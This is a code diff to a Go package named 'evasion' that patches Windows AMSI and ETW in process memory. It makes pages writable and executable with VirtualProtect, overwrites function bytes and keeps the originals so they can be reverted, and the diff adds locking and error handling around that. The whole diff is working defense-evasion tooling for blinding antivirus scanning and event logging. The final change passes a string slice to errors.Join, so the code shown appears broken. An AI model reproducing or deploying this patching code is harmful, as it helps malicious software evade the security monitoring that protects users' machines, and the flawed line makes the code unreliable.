@@ -3,6 +3,7 @@
 package evasion
 
 import (
+	"errors"
 	"fmt"
 	"strings"
 	"sync"
@@ -113,11 +114,16 @@ var (
 )
 
 func writeBytes(addr uintptr, patch []byte) error {
+	patchMu.Lock()
+	defer patchMu.Unlock()
+	return writeBytesLocked(addr, patch)
+}
+
+// writeBytesLocked applies one patch. patchMu must be held.
+func writeBytesLocked(addr uintptr, patch []byte) error {
 	if len(patch) == 0 {
 		return nil
 	}
-
-	patchMu.Lock()
 	if _, ok := savedPatches[addr]; !ok {
 		orig := make([]byte, len(patch))
 		for i := range patch {
@@ -125,34 +131,25 @@ func writeBytes(addr uintptr, patch []byte) error {
 		}
 		savedPatches[addr] = orig
 	}
-	patchMu.Unlock()
 
 	var oldProtect uint32
 	r, _, errno := procVirtualProtect.Call(
-		addr,
-		uintptr(len(patch)),
-		pageExecuteReadWrite,
-		uintptr(unsafe.Pointer(&oldProtect)),
-	)
+		addr, uintptr(len(patch)), pageExecuteReadWrite,
+		uintptr(unsafe.Pointer(&oldProtect)))
 	if r == 0 {
-		return fmt.Errorf("VirtualProtect: %w", errno)
+		return fmt.Errorf("VirtualProtect(RWX): %w", errno)
 	}
-
 	for i, b := range patch {
 		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
 	}
-
-	var unused uint32
-	procVirtualProtect.Call(
-		addr,
-		uintptr(len(patch)),
-		uintptr(oldProtect),
-		uintptr(unsafe.Pointer(&unused)),
-	)
-
+	var ignored uint32
+	if r, _, errno := procVirtualProtect.Call(
+		addr, uintptr(len(patch)), uintptr(oldProtect),
+		uintptr(unsafe.Pointer(&ignored))); r == 0 {
+		return fmt.Errorf("VirtualProtect(restore): %w", errno)
+	}
 	hProc, _, _ := procGetCurrentProcess.Call()
-	procFlushInstructionCache.Call(
-		hProc, addr, uintptr(len(patch)))
+	procFlushInstructionCache.Call(hProc, addr, uintptr(len(patch)))
 	return nil
 }
 
@@ -296,7 +293,7 @@ func RevertWindowsEvasion() error {
 
 	var errs []string
 	for addr, orig := range savedPatches {
-		if err := writeBytes(addr, orig); err != nil {
+		if err := writeBytesLocked(addr, orig); err != nil {
 			errs = append(errs,
 				fmt.Sprintf("0x%x: %v", addr, err))
 			continue
@@ -324,5 +321,5 @@ func ApplyWindowsEvasion(amsi, etw bool) error {
 	if len(errs) == 0 {
 		return nil
 	}
-	return fmt.Errorf("evasion: %v", errs)
+	return fmt.Errorf("evasion: %w", errors.Join(errs...))
 }
